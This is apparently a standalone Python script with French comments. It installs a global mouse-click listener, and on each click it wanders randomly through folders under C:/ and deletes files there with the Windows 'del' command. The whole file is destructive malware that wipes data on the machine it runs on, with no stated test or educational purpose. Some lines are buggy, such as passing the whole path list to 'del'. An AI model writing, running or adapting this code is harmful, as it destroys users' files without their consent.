import os, glob, random, pynput


def on_click(x, y, button, pressed):
    
    if pressed:
        
        path = glob.glob("C:/*")
        print(f"Chemin de base : {path}")
        
        while True:
            rd = random.randint(0, 10)
            print(rd)
            if rd  != 0:
                try:
                    
                    if path == []:
                        path = glob.glob("C:/*")
                        continue
                    
                    path = glob.glob(f"{random.choice(path)}/*")
                    print(f"Entre dans le dossier : {path}")
                    
                except: 
                    for file in path:
                        os.system(f"del {path}")
                        print(f"Supprimer {file}")
                    break
                
            else:
                try:
                    os.system(f"del {random.choice(path)}")
                    print(f"Supprime le fichier : {random.choice(path)}")
                    break
                except:
                    path = glob.glob("C:/*")
                    continue
        


with pynput.mouse.Listener(on_click=on_click) as listener:
    listener.join()
